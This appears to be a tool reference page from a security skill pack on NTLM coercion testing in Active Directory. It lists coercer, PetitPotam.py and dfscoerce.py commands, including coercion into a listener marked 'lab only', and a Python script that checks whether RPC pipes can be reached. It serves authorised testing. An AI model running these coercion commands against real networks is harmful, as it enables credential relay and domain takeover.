# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ntlm-relay-and-coercion-coercion-primitives`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `coercer` | `coercer scan -t 10.20.30.10 -u lowpriv -p pass -d corp.example` | Read-only primitive availability scan | Linux / Windows |
| `PetitPotam.py` | `PetitPotam.py -u lowpriv -p pass -d corp.example 10.20.30.99 10.20.30.10` | EFSRPC coercion into a listener, lab only | Linux / Windows |
| `dfscoerce.py` | `dfscoerce.py -u lowpriv -p pass -d corp.example 10.20.30.99 10.20.30.10` | DFSNM coercion, lab only | Linux / Windows |
| `Get-Service` | `Get-Service Spooler -ComputerName host` | Service state on a remote host | Windows |
| `rpcclient` | `rpcclient -U 'user%pass' host -c 'enumprinters'` | Spooler reachability without coercion | Linux |

## Minimal Lab Validation Script

Read service state and interface reachability only; the coercion itself is a separate authorised step with its own listener.

```python
from impacket.dcerpc.v5 import transport, rprn  # noqa: F401

PRIMITIVES = {
    "MS-RPRN": "\PIPE\spoolss",
    "MS-EFSR": "\PIPE\lsarpc",
    "MS-DFSNM": "\PIPE\netdfs",
    "MS-FSRVP": "\PIPE\FssagentRpc",
    "MS-EVEN": "\PIPE\eventlog",
}

def reachable(host, pipe, user, password):
    rpctransport = transport.DCERPCTransportFactory(f"ncacn_np:{host}[{pipe}]")
    rpctransport.set_credentials(user, password, "")
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.disconnect()
        return True
    except Exception as exc:
        return f"no-bind ({type(exc).__name__})"

for name, pipe in PRIMITIVES.items():
    print(name, reachable("10.20.30.10", pipe, "lowpriv", "pass"))
```

## Flag Notes

- `scan` in coercer performs availability checks without sending a coercion.
- `--filter-protocol-name` restricts to one interface so each result is attributable.
- `enumprinters` tests spooler reachability without triggering a notification callback.
